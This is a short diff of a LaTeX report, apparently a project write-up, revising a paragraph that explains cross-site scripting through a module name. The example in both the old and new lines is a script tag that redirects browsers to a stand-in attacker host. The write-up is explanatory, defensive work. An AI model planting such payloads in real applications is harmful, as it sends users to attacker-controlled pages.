@@ -58,11 +58,11 @@ so that it is not executed directly in the database.
 
 Cross-site scripting (abbreviated XSS) is an attack involving a malicious user
 sending data to the application which is then displayed without first being
-sanitised. For example, in this application, a department could upload a
-module with the name:
+sanitised. For example, in this application, an authenticated administrator
+could upload a module with the name:
 
 \begin{lstlisting}
-<script>document.location='http://www.malicioussite.example/exploit.html'</script>
+<script>document.location='http://www.evil.example/exploit.html'</script>
 \end{lstlisting}
 
 If this module name was to be displayed to a student before being sanitised,
